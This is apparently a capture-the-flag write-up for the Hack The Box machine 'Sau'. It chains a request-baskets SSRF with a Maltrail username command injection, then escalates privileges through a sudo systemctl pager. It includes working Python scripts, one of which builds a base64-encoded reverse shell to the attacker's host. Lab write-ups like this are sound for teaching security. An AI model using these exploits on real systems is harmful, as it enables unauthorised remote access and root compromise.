## Port Scan

```shell
└─$ nmap 10.10.11.224 -sV
Starting Nmap 7.94SVN ( https://nmap.org ) at 2023-12-04 08:23 EST
Nmap scan report for 10.10.11.224
Host is up (0.037s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT      STATE    SERVICE VERSION
22/tcp    open     ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
80/tcp    filtered http
55555/tcp open     unknown
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port55555-TCP:V=7.94SVN%I=7%D=12/4%Time=656DD2D6%P=x86_64-pc-linux-gnu%
SF:r(GetRequest,A2,"HTTP/1\.0\x20302\x20Found\r\nContent-Type:\x20text/htm
SF:l;\x20charset=utf-8\r\nLocation:\x20/web\r\nDate:\x20Mon,\x2004\x20Dec\
SF:x202023\x2012:23:34\x20GMT\r\nContent-Length:\x2027\r\n\r\n<a\x20href=\
SF:"/web\">Found</a>\.\n\n")%r(GenericLines,67,"HTTP/1\.1\x20400\x20Bad\x2
SF:0Request\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection
SF::\x20close\r\n\r\n400\x20Bad\x20Request")%r(HTTPOptions,60,"HTTP/1\.0\x
SF:20200\x20OK\r\nAllow:\x20GET,\x20OPTIONS\r\nDate:\x20Mon,\x2004\x20Dec\
SF:x202023\x2012:23:35\x20GMT\r\nContent-Length:\x200\r\n\r\n")%r(RTSPRequ
SF:est,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/pla
SF:in;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Reque
SF:st")%r(Help,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20
SF:text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\
SF:x20Request")%r(SSLSessionReq,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\n
SF:Content-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r
SF:\n\r\n400\x20Bad\x20Request")%r(TerminalServerCookie,67,"HTTP/1\.1\x204
SF:00\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r
SF:\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request")%r(TLSSessionReq,6
SF:7,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x
SF:20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request")%
SF:r(Kerberos,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20t
SF:ext/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x
SF:20Request")%r(FourOhFourRequest,EA,"HTTP/1\.0\x20400\x20Bad\x20Request\
SF:r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nX-Content-Type-Opti
SF:ons:\x20nosniff\r\nDate:\x20Mon,\x2004\x20Dec\x202023\x2012:24:00\x20GM
SF:T\r\nContent-Length:\x2075\r\n\r\ninvalid\x20basket\x20name;\x20the\x20
SF:name\x20does\x20not\x20match\x20pattern:\x20\^\[\\w\\d\\-_\\\.\]{1,250}
SF:\$\n")%r(LPDString,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Ty
SF:pe:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\
SF:x20Bad\x20Request")%r(LDAPSearchReq,67,"HTTP/1\.1\x20400\x20Bad\x20Requ
SF:est\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20
SF:close\r\n\r\n400\x20Bad\x20Request");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 91.18 seconds
```

There is an accessible website listening on port 55555.

**WARNING: doing more scan, also port 8338 seems to be available!**

Port 55555 is the only one that can be accessed, the other ports are firewalled.
## Website

The website is really simple but it shows that it's using `requests-baskets` at the bottom. 
That software is known to be vulnerable to a SSRF that is easily found online.

This vulnerability allows to create an actual proxy on the server so that firewalled ports can be checked from the inside.

Sending the following command one can create a basket named `randomstring` that forwards all requests to the `forward_url`.

```python
>>> r = requests.post("http://sau.htb:55555/api/baskets/randomstring", data={"forward_url": "http://127.0.0.1:8338", "proxy_response": True, "insecure_tls": False, "expand_path": True, "capacity": 250})
>>> r.content
b'{"token":"b9PWVxKGKMQPqhz2M62JSc7PH1cHyJF0gswbhr1SpZRm"}'
```

Once created one can access the basket via `http://sau.htb:55555/randomstring` and all requests will be simply forwarded; responses will be received afterwards. So that's effectively a proxy.

To access the URL, by the way it is important to add the `Authorization` entry into the HTTP headers. The value corresponds to the token obtained in the creation of the basket.

With a script like this we can do everything:

```python
import json
import random
import requests
import string
import sys

attack_url = sys.argv[1]

letters = string.ascii_lowercase
random_name = ''.join(random.choice(letters) for i in range(10))
api_url = "http://sau.htb:55555/api/baskets/" + random_name
url = "http://sau.htb:55555/" + random_name
collect_url = "http://sau.htb:55555/api/baskets/" + random_name + "/requests"

print("Testing basket", random_name)
r = requests.post(api_url, 
    headers={"Content-Type": "application/json"},
        json={
        "forward_url": attack_url,
        "proxy_response": True, 
        "insecure_tls": False, 
        "expand_path": True, 
        "capacity": 250
        })
if not r.ok:
        print("Error")
        print(r.headers)
        print(r.content)
        sys.exit()
else:
    token = json.loads(r.content)['token']
    print(token)

r = requests.get(url, headers={"Authorization": token})
if not r.ok:
        print("Error in GET1")
        sys.exit()
else:
        print(r.headers)
        print(r.content)

```

Now we try with `forward_url`: `http://127.0.0.1:8338` and we read the HTML returning in the response and it shows a link to a Google Sheet document.

The google sheet document is a document created by `Maltrails`, another software with a known vulnerability.

## Combining Vulnerabilities

There is an existing exploit for `Maltraits`. Encoding in base64 the username in the login endpoint, one can get RCE. Here is the modified code to adapt to this specific scenario, with the proxy provided by `request-baskets`.

```python

import sys
import os
import base64

if len(sys.argv) != 5:
    print("Error. Needs listening IP, PORT and target URL.")
    sys.exit(-1)

my_ip = sys.argv[1]
my_port = sys.argv[2]
token = sys.argv[4]
target_url = sys.argv[3]

print("Running exploit on " + str(target_url))

payload = f'python3 -c \'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{my_ip}",{my_port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")\''
encoded_payload = base64.b64encode(payload.encode()).decode()  # encode the payload in Base64
command = f"curl '{target_url}' -H 'Authorization: {token}'  --data 'username=;`echo+\"{encoded_payload}\"+|+base64+-d+|+sh`'"
print(command)
os.system(command)

```

This opens a reverse shell, just have a netcat listening on `my_ip`:`my_port`.
The `target_url` has to be created first in the initial step, then the token must be manually passed to this script.

The reverse shell is open, the `user.txt` file is in `/home/puma` and the flag is done.

## Privilege Escalation

Running `linpeas.sh` we see that the command:

```shell
sudo /usr/bin/systemctl status trail.service
```

can be executed from non-privileged users. 
This opens the pager that shows the systemd log of the service.

But the pager allows to run shell commands as commands!
Just type `:` and once the prompt allows for it, type `!sh`

This opens a shell with administrator rights.

The `root.txt` file is in `/root` and we got the flag!